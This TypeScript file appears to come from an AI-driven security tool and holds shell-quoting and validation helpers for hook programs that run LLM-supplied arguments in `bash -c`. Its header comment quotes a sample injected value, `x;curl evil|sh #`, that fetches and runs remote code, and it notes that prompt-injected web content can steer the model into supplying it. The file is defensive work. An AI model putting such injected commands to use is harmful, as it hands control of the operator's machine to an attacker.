// Shell-argument quoting + validators for hook tools.
//
// Hook programs build shell scripts (`bash -c`, `sh -c`) with LLM-supplied
// arguments interpolated in. Without quoting, a value like
// `x;curl evil|sh #` (reachable via prompt-injected crawl/HTTP content)
// executes on the hunter's own box. Quote every interpolated value and
// validate network targets with host()/port() before use.

export namespace Shell {
  // POSIX single-quote escaping: wrap in '...', close-escape-reopen on embedded ticks.
  export function quote(value: string): string {
    return `'${value.replace(/'/g, `'\\''`)}'`
  }

  const HOST = /^(?=.{1,253}$)([A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?)(\.[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?)*$/
  const IPV4 = /^\d{1,3}(\.\d{1,3}){3}$/
  const IPV6 = /^[0-9a-fA-F:]+(%[A-Za-z0-9._-]+)?$/
  const CIDR = /^\d{1,3}(\.\d{1,3}){3}\/\d{1,2}$/

  // Hostname, IPv4/IPv6, or CIDR. Throws on anything else (shell metachars,
  // whitespace, URLs with credentials, option-looking strings).
  export function host(value: string, what = "host"): string {
    const v = value.trim()
    if (v.startsWith("-")) throw new Error(`invalid ${what}: option-looking value rejected`)
    if (/\s/.test(v)) throw new Error(`invalid ${what}: whitespace rejected`)
    if (/[;&|$`\\!#*?~<>(){}[\]]/.test(v)) throw new Error(`invalid ${what}: shell metacharacters rejected`)
    if (HOST.test(v) || IPV4.test(v) || (v.includes(":") && IPV6.test(v)) || CIDR.test(v)) return v
    throw new Error(`invalid ${what}: not a hostname, IP, or CIDR`)
  }

  export function port(value: string | number, what = "port"): string {
    const n = typeof value === "number" ? value : Number(String(value).trim())
    if (!Number.isInteger(n) || n < 1 || n > 65535) throw new Error(`invalid ${what}: must be 1-65535`)
    return String(n)
  }

  // Comma-separated port list (nmap -p style): digits, commas, dashes only.
  export function portList(value: string, what = "ports"): string {
    const v = value.trim()
    if (!/^[0-9,\-]+$/.test(v) || v.length > 200) throw new Error(`invalid ${what}: must be digits/commas/dashes`)
    return v
  }

  export function iface(value: string): string {
    const v = value.trim()
    if (!/^[A-Za-z0-9._:-]{1,32}$/.test(v)) throw new Error("invalid interface: must match [A-Za-z0-9._:-]")
    return v
  }

  // host:port pair (socat/ncat forward targets).
  export function hostPort(value: string, what = "target"): string {
    const idx = value.lastIndexOf(":")
    if (idx === -1) throw new Error(`invalid ${what}: expected host:port`)
    return `${host(value.slice(0, idx), what)}:${port(value.slice(idx + 1), what)}`
  }
}
